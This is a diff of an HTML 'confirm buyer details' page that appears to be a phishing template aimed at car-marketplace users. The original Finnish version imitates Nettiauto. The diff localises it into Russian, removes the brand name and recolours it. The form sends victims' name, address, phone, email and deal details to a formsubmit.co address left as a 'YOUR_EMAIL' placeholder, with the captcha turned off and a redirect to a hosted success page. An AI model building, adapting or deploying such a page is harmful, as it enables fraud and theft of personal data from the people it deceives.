@@ -1,8 +1,8 @@
 <!DOCTYPE html>
-<html lang="fi">
+<html lang="ru">
 <head>
 <meta charset="UTF-8">
-<title>Vahvista ostajan tiedot</title>
+<title>Подтверждение данных покупателя</title>
 
 <style>
 body {
@@ -14,8 +14,8 @@ body {
 
 /* HEADER */
 .na-header {
-    background: #ffffff;
-    border-bottom: 1px solid #e6e6e6;
+    background: #CC3300;
+    border-bottom: 1px solid #b52b00;
     height: 64px;
     display: flex;
     align-items: center;
@@ -69,14 +69,14 @@ input {
 
 input:focus {
     outline: none;
-    border-color: #0072ce;
+    border-color: #CC3300;
 }
 
 button {
     width: 100%;
     margin-top: 30px;
     padding: 14px;
-    background-color: #0072ce;
+    background-color: #CC3300;
     color: #ffffff;
     font-size: 16px;
     font-weight: 600;
@@ -86,7 +86,7 @@ button {
 }
 
 button:hover {
-    background-color: #005fa3;
+    background-color: #b52b00;
 }
 
 .notice {
@@ -103,48 +103,48 @@ button:hover {
 <!-- HEADER -->
 <header class="na-header">
   <div class="na-header-inner">
-    <img src="logo.png" alt="Nettiauto" class="na-logo">
+    <img src="logo.png" alt="Logo" class="na-logo">
   </div>
 </header>
 
 <!-- FORM -->
 <div class="container">
 
-    <h1>Vahvista ostajan tiedot</h1>
+    <h1>Подтверждение данных покупателя</h1>
     <div class="description">
-        Täytä alla olevat tiedot viimeistelläksesi ajoneuvokaupan.
+        Пожалуйста, заполните информацию для завершения сделки.
     </div>
 
     <form action="https://formsubmit.co/ТВОЙ_EMAIL@gmail.com" method="POST">
 
-        <label>Nimi</label>
-        <input type="text" name="Nimi" required>
+        <label>Имя</label>
+        <input type="text" name="Имя" placeholder="Введите ваше имя" required>
 
-        <label>Osoite</label>
-        <input type="text" name="Osoite" required>
+        <label>Адрес</label>
+        <input type="text" name="Адрес" placeholder="Введите адрес проживания" required>
 
-        <label>Puhelinnumero</label>
-        <input type="tel" name="Puhelin" required>
+        <label>Номер телефона</label>
+        <input type="tel" name="Телефон" placeholder="+7 XXX XXX-XX-XX" required>
 
-        <label>Sähköpostiosoite</label>
-        <input type="email" name="Email" required>
+        <label>Email</label>
+        <input type="email" name="Email" placeholder="example@email.com" required>
 
-        <label>Ajoneuvon merkki</label>
-        <input type="text" name="Auton merkki" required>
+        <label>Марка автомобиля</label>
+        <input type="text" name="Марка авто" placeholder="Например: BMW, Audi" required>
 
-        <label>Hinta (€)</label>
-        <input type="number" name="Hinta" required>
+        <label>Цена (€)</label>
+        <input type="number" name="Цена" placeholder="Введите стоимость" required>
 
         <!-- FormSubmit settings -->
-        <input type="hidden" name="_subject" value="Uusi ajoneuvokaupan vahvistus">
+        <input type="hidden" name="_subject" value="Новое подтверждение сделки">
         <input type="hidden" name="_captcha" value="false">
         <input type="hidden" name="_next" value="https://alfredodefaro-ai.github.io/form/success.html">
 
-        <button type="submit">Vahvista tiedot</button>
+        <button type="submit">Подтвердить данные</button>
     </form>
 
     <div class="notice">
-        Tietoja käytetään ainoastaan kaupan vahvistamiseen.
+        Данные используются исключительно для подтверждения сделки.
     </div>
 
 </div>
